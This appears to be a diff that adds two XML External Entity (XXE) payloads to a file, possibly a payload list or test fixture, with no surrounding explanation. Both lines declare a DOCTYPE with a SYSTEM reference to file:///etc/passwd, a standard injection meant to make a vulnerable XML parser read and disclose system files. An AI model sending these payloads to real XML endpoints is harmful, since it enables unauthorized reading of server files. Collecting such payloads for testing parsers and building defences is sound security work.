@@ -1,0 +1,2 @@
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<?xml version="1.0"?><!DOCTYPE data SYSTEM "file:///etc/passwd">
